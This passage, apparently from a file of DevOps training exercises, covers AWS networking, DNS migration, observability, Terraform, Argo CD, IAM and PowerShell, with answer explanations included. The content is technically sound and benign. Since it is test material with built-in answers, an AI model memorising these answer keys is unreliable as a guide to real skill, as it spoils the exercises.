*    DENY   ALL  ALL          0.0.0.0/0
# NACL outbound (private subnet)
100  ALLOW  TCP  443          0.0.0.0/0
*    DENY   ALL  ALL          0.0.0.0/0
explanation: NACLs are stateless: replies to the bastion go out to ephemeral ports (1024–65535), which the outbound rules don't allow. Add an outbound ALLOW for TCP 1024-65535 to 10.0.1.0/24. Security groups are stateful, which is why this only bites with NACLs.

title: CIDR planning
scenario: Split `10.20.0.0/16` into four equal subnets.
explanation: Four equal parts of a /16 are /18s, each 16,384 addresses, starting at .0, .64, .128 and .192 in the third octet.

title: Move a domain's DNS to Route 53 safely
question: Order migrating `acme.io` DNS from the old provider to Route 53.
items: Export all records from the old provider and create them in a Route 53 hosted zone
Verify every record by querying the Route 53 name servers directly (`dig @ns-xxx.awsdns-xx.com`)
Lower the NS TTL at the registrar/parent where possible, and wait
Update the domain's name servers at the registrar to the Route 53 set
Monitor resolution and keep the old zone intact until the old NS TTL has fully expired
explanation: Copy, verify against the new name servers, then switch delegation. Keep the old provider serving identical records until caches everywhere have moved — often 48 hours for NS records.

title: OTel Collector pipeline
template:
receivers:
  otlp:
    protocols: { grpc: {}, http: {} }
processors:
  batch: {}
exporters:
  otlphttp/tempo: { endpoint: http://tempo:4318 }
service:
  pipelines:
    {{sig}}:
      receivers: [otlp]
      processors: [{{proc}}]
      exporters: [otlphttp/tempo]
explanation: Pipelines are defined per signal (traces, metrics, logs). The batch processor groups data for efficient export. Add `memory_limiter` first in production.

title: This recording rule explodes cardinality
code:
groups:
  - name: api
    rules:
      - record: api:request_rate:5m
        expr: sum by (service, route, pod, request_id) (rate(http_requests_total[5m]))
explanation: Grouping by `request_id` (and `pod`) keeps a series per request, which defeats the point of aggregating. Record by bounded labels only, such as `sum by (service, route, code)`.

title: Introduce SLOs to a team
question: Order adopting SLOs for the payments API.
items: Pick user-centric SLIs (successful requests, latency under a threshold)
Measure the current baseline for a few weeks
Set SLO targets a bit below the baseline, agreed with product
Create multi-window burn-rate alerts and an error-budget dashboard
Agree an error-budget policy (e.g. freeze risky releases when exhausted)
explanation: Measure before you promise. SLOs only change behaviour once an error-budget policy ties them to release decisions.

title: Advanced function with -WhatIf
explanation: `SupportsShouldProcess` gives your function `-WhatIf` and `-Confirm`, and `$PSCmdlet.ShouldProcess()` honours them — the same safety net built-in cmdlets have.

title: Retry with backoff and jitter
explanation: Full-jitter exponential backoff (random between 0 and base·2ⁱ, capped) spreads retries out and avoids thundering herds. Re-raise on the final attempt so failures stay visible.

title: Upgrade the AWS provider across a major version
question: Order upgrading from AWS provider 5.x to 6.x across 30 stacks.
items: Read the upgrade guide and search code for removed/renamed arguments
Bump the constraint in one non-prod stack, `terraform init -upgrade`, and review the plan
Fix deprecations until the plan shows only expected changes
Roll the same change stack by stack, prod last, applying reviewed plans
Commit the updated `.terraform.lock.hcl` files
explanation: Major provider versions change resource behaviour. Canary the upgrade in non-prod and require plans with no surprise replacements before you touch prod.

title: Hotfix with trunk-based releases
question: Production runs tag `v3.4.0` from branch `release/3.4`. Order a safe hotfix.
items: Fix the bug on main with a test, and merge the PR
Cherry-pick the fix onto `release/3.4` (`git cherry-pick -x <sha>`)
CI builds and tests the release branch
Tag `v3.4.1` and deploy it
Confirm the fix in production and close the incident
explanation: Fix on trunk first so the bug can't come back in the next release, then backport. `-x` records where the commit came from.

title: Reusable workflow call
scenario: Call the org's shared deploy workflow and pass the image digest and the secrets it needs.
template:
jobs:
  deploy:
    {{key}}: acme/platform/.github/workflows/deploy.yml@v3
    with:
      image-digest: ${{ needs.build.outputs.digest }}
      environment: prod
    secrets: {{sec}}
explanation: A job-level `uses:` calls a reusable workflow, and `secrets: inherit` passes the caller's secrets. Many security teams prefer listing secrets explicitly, so the shared workflow only receives what it needs.

title: Argo CD Application with auto-sync
template:
apiVersion: argoproj.io/v1alpha1
kind: {{kind}}
metadata:
  name: payments
  namespace: argocd
spec:
  project: payments
  source:
    repoURL: https://github.com/acme/gitops.git
    targetRevision: main
    path: apps/payments/overlays/prod
  destination:
    server: https://kubernetes.default.svc
    namespace: payments
  syncPolicy:
    {{auto}}:
      prune: true
      {{heal}}: true
explanation: `syncPolicy.automated` turns on auto-sync, `prune` deletes removed resources, and `selfHeal` reverts drift. Add `syncOptions: [CreateNamespace=true]` if Argo should create the namespace.

title: Promote a release through environments
question: Order a GitOps promotion of a new image from dev to prod.
items: CI builds, scans and signs the image, then pushes it by digest
An automated PR bumps the digest in the dev overlay; Argo syncs dev
Smoke tests and SLO checks pass in dev/staging
Open a PR promoting the same digest to the prod overlay; required approvals
Merge; Argo syncs prod (canary via Argo Rollouts if configured)
explanation: The same immutable digest moves through environments, and only the overlay changes. Promotion is a reviewed commit, so rollback is `git revert`.

title: Why did this delete everything in the namespace?
scenario: After merging, Argo CD deleted every resource in `payments`. Which **two** lines together made that possible?
code:
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: payments
spec:
  source:
    repoURL: https://github.com/acme/gitops.git
    targetRevision: main
    path: apps/payment/overlays/prod
  destination:
    namespace: payments
  syncPolicy:
    automated: { prune: true, allowEmpty: true }
explanation: The typo `apps/payment/` points at an empty path, so Argo saw zero desired resources. Normally automated sync refuses to prune an app down to nothing, but `allowEmpty: true` removed that safety net. Keep `allowEmpty` off, and treat diffs that delete many resources as a required review item.

title: for_each over a map
scenario: Create one private subnet per AZ from a map, so removing one AZ never shifts the others.
explanation: Addresses become `aws_subnet.private["eu-central-1a"]`, which stay stable. With `count`, removing the first element would shift every index and recreate subnets.

title: Plan shows a new provider every run
scenario: Different engineers get different AWS provider versions and occasional surprise diffs. Which line is the problem?
explanation: `>= 4.0` accepts any future major version, including breaking ones. Use `~> 5.80` (allows 5.x minor upgrades only) and commit `.terraform.lock.hcl`.

title: Zero-downtime DNS cutover
question: Order a DNS migration of `api.acme.io` from the old ALB to a new one.
items: Lower the record's TTL to 60s at least one old-TTL period in advance
Stand up the new ALB and verify it directly (curl --resolve)
Switch the record (or use weighted records to shift 10% → 100%)
Watch error rates and traffic on both; keep the old ALB running
After old-TTL × 2 with no traffic on the old ALB, decommission it and raise the TTL
explanation: TTLs only work if you lower them before the change. Weighted records give you a canary, and you keep the old target until caches have drained.

title: Test a backend directly, bypassing DNS
scenario: Hit the new ALB at `52.28.10.4` with the real hostname and SNI before switching DNS.
template: curl -sv --{{flag}} api.acme.io:443:52.28.10.4 https://api.acme.io/health
explanation: `--resolve host:port:ip` pins the name to an IP while keeping the correct Host header and SNI, so the certificate is validated just as it will be after cutover.

title: A Prometheus alert rule
scenario: Page when more than 5% of `checkout` requests fail for 10 minutes.
template:
groups:
  - name: checkout
    rules:
      - alert: CheckoutHighErrorRate
        expr: |
          sum(rate(http_requests_total{service="checkout",code=~"5.."}[5m]))
            / sum({{fn}}(http_requests_total{service="checkout"}[5m])) > 0.05
        {{dur}}: 10m
        labels:
          severity: page
        annotations:
          runbook_url: https://runbooks.acme.io/checkout-errors
explanation: Both sides of the ratio must be `rate()` over the same window. `for: 10m` requires the condition to hold continuously before firing, which suppresses blips.

title: IAM policy review
scenario: This policy is meant to let a Lambda read one secret. Which line is the problem?
explanation: `Resource: *` allows reading every secret in the account. Scope it to the secret's ARN (with a trailing `-??????` for the random suffix), and use a customer-managed KMS key with its own key policy.

title: Respond to a GuardDuty crypto-mining finding on EKS
question: Order the response to `CryptoCurrency:Runtime/BitcoinTool.B` on a Pod.
items: Isolate the Pod (deny-all NetworkPolicy / cordon the node) without deleting it
Capture evidence: Pod spec, image digest, logs, node snapshot
Identify the entry point (vulnerable image, exposed dashboard, leaked credentials)
Rotate any credentials the workload could reach and remove the malicious workload
Fix the root cause (patch, admission policy, RBAC) and add detection rules
explanation: Contain, preserve evidence, find the root cause, eradicate, then prevent a recurrence. Deleting the Pod first destroys the evidence you need to find out how it got in.

title: This catch never fires
scenario: The script should log and exit when the copy fails, but on failure it prints red text and carries on.
explanation: `Copy-Item` raises a non-terminating error, so `catch` is skipped. Add `-ErrorAction Stop` to line 2 (or set `$ErrorActionPreference = 'Stop'` at the top).

title: Restart a service on many servers
scenario: Restart the `W3SVC` service on every server in `web.txt`, in parallel over remoting, and stop on the first error.
explanation: `Invoke-Command -ComputerName` fans out over WinRM in parallel, and `-ErrorAction Stop` turns a failed restart into a real error you can see per server (`PSComputerName`).

title: Patch night for an IIS farm
question: Order a safe rolling patch of one IIS node behind a load balancer.
items: Drain the node in the load balancer and wait for connections to finish
Install updates (`Install-WindowsUpdate` / WSUS / Azure Update Manager)
Reboot and wait for it to come back
Verify `Get-Service W3SVC,WAS` and `Test-NetConnection -Port 443`, plus a synthetic check
Put the node back in the pool, then move to the next one
explanation: Drain, patch, reboot, verify, return — one node at a time. The verification step catches what bit the IIS lab: a service whose start type was changed during patching.

title: The script that never times out
scenario: This health checker hung for 6 hours in CI last night. Which line causes it?
code:
import requests, sys

def check(url):
    r = requests.get(url)
    return r.status_code == 200

if __name__ == "__main__":
    bad = [u for u in sys.argv[1:] if not check(u)]
    sys.exit(1 if bad else 0)
explanation: `requests` has no default timeout, so a server that accepts the connection but never answers hangs forever. Use `requests.get(url, timeout=(3, 10))`, and set `timeout-minutes` on the CI job as a backstop.

title: Paginate S3 with boto3
scenario: Count every object under `logs/` in bucket `acme-audit`, however many there are.
template:
import boto3
s3 = boto3.client("s3")
pages = s3.{{fn}}("list_objects_v2").paginate(Bucket="acme-audit", {{arg}}="logs/")
total = sum(len(p.get("Contents", [])) for p in pages)
print(total)
explanation: `get_paginator` handles `ContinuationToken` for you, and `Prefix` narrows the listing. `p.get("Contents", [])` guards against empty pages, which have no Contents key.

title: Ship an internal CLI
question: Order the steps to publish an internal Python CLI that other teams install safely.
items: Define the package in `pyproject.toml` with a console-script entry point
Lock and pin dependencies (uv.lock / requirements with hashes)
Run ruff, mypy and pytest in CI
Build a wheel and publish to the internal index (CodeArtifact/Artifactory) with provenance
Users install with `pipx install acme-cli` (isolated venv per tool)
explanation: Declare it, lock it, test it, publish it, and install it isolated. `pipx` (or `uv tool install`) keeps each CLI in its own venv so tools don't break each other.
